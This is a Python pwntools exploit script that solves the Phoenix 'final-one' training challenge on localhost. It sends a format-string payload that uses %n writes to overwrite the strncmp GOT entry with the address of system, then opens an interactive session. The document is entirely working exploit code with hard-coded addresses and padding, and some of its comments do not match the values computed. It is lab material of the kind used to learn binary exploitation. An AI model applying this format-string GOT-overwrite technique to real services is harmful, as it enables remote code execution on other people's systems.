#!/usr/bin/env python3
from pwn import *

# context.log_level = "debug"
path = "/opt/phoenix/i486/final-one"
elf = context.binary = path
context.arch = "amd64"

# hostname = 127.0.0.1, assume ephemeral port is 5 digits
username = b"username a"
# test_prefix = b"Login from testing:12121 as [a] with password [a" # 14 needed
prefix = b"Login from 127.0.0.1:xxxxx as [a] with password [abcAAAABBBBCCCCDDDD"
strncmp_gotplt = 0x8049E60

# system = 0xf7fad824
# | 24 d8 | fa f7 |
# (0xd824) (0xf7fa)
#    1        2
count1 = str(0xD824 - len(prefix)).encode("ascii")
count2 = str(0xF7FA - 0xD824).encode("ascii")

# overwrite strncmp GOT entry with system
# need to make sure len(password) <= 127
password = b"login abc"
password += b"AAAA"  # padding
password += pack(strncmp_gotplt)
password += b"CCCC"  # padding
password += pack(strncmp_gotplt + 2)
# reach addresses
password += b"%.0s" * 15
# write 0x7fff bytes
password += b"%" + count1 + b"x"  # AAAA
password += b"%n"
# write 0xed9c bytes
password += b"%" + count2 + b"x"  # CCCC
password += b"%n"

io = remote("127.0.0.1", 64014)
# io = process([path, "--test"])
io.recvline()
io.recv()
io.sendline(username)
io.recv()
io.sendline(password)
io.interactive(prompt="")
